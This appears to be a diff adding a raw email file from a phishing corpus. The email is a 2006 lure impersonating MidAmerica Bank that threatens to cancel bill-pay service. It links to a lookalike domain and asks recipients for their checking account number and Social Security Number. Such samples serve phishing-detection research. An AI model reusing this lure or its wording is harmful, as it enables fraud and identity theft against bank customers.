@@ -1,0 +1,99 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <root@cobra.chargertek.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id A925E46A2B
+ for <user@login.example.com>; Fri, 15 Sep 2006 12:44:28 -0400 (EDT)
+Received: from cobra.chargertek.com (unknown [208.101.24.197])
+ by mail.example.org (Postfix) with ESMTP id ABB266CD092
+ for <user@example.com>; Fri, 15 Sep 2006 12:44:28 -0400 (EDT)
+Received: from root by cobra.chargertek.com with local (Exim 4.52)
+ id 1GOGne-0003cs-T7
+ for user@example.com; Fri, 15 Sep 2006 12:44:22 -0400
+To: user@example.com
+Subject: Internet Notification From MidAmerica Bank!
+From: MidAmerica Bank <service@midamerica.com>
+Content-Type: text/html
+Message-Id: <E1GOGne-0003cs-T7@cobra.chargertek.com>
+Date: Fri, 15 Sep 2006 12:44:22 -0400
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - cobra.chargertek.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [0 0] / [47 12]
+X-AntiAbuse: Sender Address Domain - cobra.chargertek.com
+X-Source: /usr/bin/php
+X-Source-Args: php -f paypal.php 
+X-Source-Dir: /root/.ssh
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 247
+
+
+<html>
+
+<body>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="63%" id="AutoNumber1">
+  <tr>
+    <td width="100%">
+    <p align="center">
+    <img border="0" src="http://www.midamericabank.com/images/front_logo.gif" width="221" height="72"><br>
+    &nbsp;</p>
+<p align="left"><font face="Verdana" size="2">&nbsp;Dear Mid America Bank Client,<br>
+&nbsp;&nbsp;&nbsp;<br>
+&nbsp;This is your official notification from Mid America Bank&nbsp;that the service(s) listed below<br>
+&nbsp;will be deactivated and deleted if not renewed immediately. Previous
+notifications have<br>
+&nbsp;been sent to the Billing Contact assigned to this account. As the Primary
+Contact, you<br>
+&nbsp;must renew the service(s) listed below or it will be deactivated and
+deleted.&nbsp;<br>
+<br>
+&nbsp;<a target="_blank" href="http://www.midamericabank.energobit.com/secure/log_into.htm"><font color="#003399" face="Verdana" size="2"><b>Renew
+Now</b></font></a>&nbsp; your&nbsp;Mid America Bank Bill Pay Services.<br>
+<br>
+If you are not enrolled to Web Branch, please enter your checking account number
+as&nbsp;<br>
+Member Number&nbsp; and Social Security Number&nbsp; as Password.</font></p>
+<div>
+  <font face="Verdana" size="2">&nbsp;<br>
+  &nbsp;<font color="#000080"><b>SERVICE</b></font>: Mid America Bank Bill Pay Services.<br>
+  &nbsp;<font color="#000080"><b>EXPIRATION</b></font>:&nbsp;September 14, 2006</font>
+</div>
+<div>
+  <font face="Verdana" size="2">&nbsp;</font>
+</div>
+<div>
+  <font face="Verdana" size="2"><br>
+  &nbsp;Thank you,&nbsp;sincerely,<br>
+  <br>
+  &nbsp;<b>Benny Crawford</b>,
+  Customer Service.</font>
+</div>
+<div>
+  <font face="Verdana" size="2">&nbsp;</font>
+</div>
+<div>
+  <font face="Verdana" size="2"><br>
+  &nbsp;==============================================================&nbsp;<br>
+  &nbsp; IMPORTANT CUSTOMER SUPPORT INFORMATION<br>
+  &nbsp;==============================================================</font>
+</div>
+<div>
+  <font face="Verdana" size="2">&nbsp;</font>
+</div>
+<div>
+  <font face="Verdana" size="2">&nbsp;</font></div>
+    <p align="center"><b><font size="2" face="Verdana">Copyright © NMid America 
+    Bank 2006. All rights reserved.</font></b><br>
+    </p>
+    </td>
+  </tr>
+</table>
+
+</body>
+
+</html>
